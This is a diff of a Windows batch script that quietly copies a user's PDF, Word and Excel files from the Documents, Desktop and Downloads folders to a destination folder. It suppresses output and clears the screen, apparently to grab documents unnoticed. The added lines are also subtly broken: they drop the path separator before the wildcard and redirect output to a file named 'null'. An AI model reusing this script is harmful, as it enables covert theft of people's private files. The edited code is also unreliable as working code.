@@ -17,20 +17,23 @@ REM /E Copies directories and subdirectories, including empty ones.
 
 REM Add more of the line below specifying the location and file type
 REM The below example grabs all .pdf files from the user's documents folder
-REM xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\*.pdf %dst% >>nul
+REM xcopy /C /Q /G /Y %USERPROFILE%\Documents\*.pdf %dst% >>nul
 
-xcopy /C /Q /G /Y %USERPROFILE%\Documents\*.pdf %dst% >>nul
-xcopy /C /Q /G /Y %USERPROFILE%\Documents\*.docx %dst% >>nul
+xcopy /C /Q /G /Y "%USERPROFILE%\Documents*.pdf" "%dst%" >> null
+xcopy /C /Q /G /Y "%USERPROFILE%\Documents*.docx" "%dst%" >> null
+xcopy /C /Q /G /Y "%USERPROFILE%\Documents*.xls" "%dst%" >> null
 )
 
 if Exist %USERPROFILE%\Desktop (
-xcopy /C /Q /G /Y %USERPROFILE%\Desktop\*.pdf %dst% >>nul
-xcopy /C /Q /G /Y %USERPROFILE%\Desktop\*.docx %dst% >>nul
+xcopy /C /Q /G /Y "%USERPROFILE%\Desktop*.pdf" "%dst%" >> null
+xcopy /C /Q /G /Y "%USERPROFILE%\Desktop*.docx" "%dst%" >> null
+xcopy /C /Q /G /Y "%USERPROFILE%\Desktop*.xls" "%dst%" >> null
 )
 
 if Exist %USERPROFILE%\Downloads (
-xcopy /C /Q /G /Y %USERPROFILE%\Downloads\*.pdf %dst% >>nul
-xcopy /C /Q /G /Y %USERPROFILE%\Downloads\*.docx %dst% >>nul
+xcopy /C /Q /G /Y "%USERPROFILE%\Downloads*.pdf" "%dst%" >> null
+xcopy /C /Q /G /Y "%USERPROFILE%\Downloads*.docx" "%dst%" >> null
+xcopy /C /Q /G /Y "%USERPROFILE%\Downloads*.xls" "%dst%" >> null
 )
 
 @cls
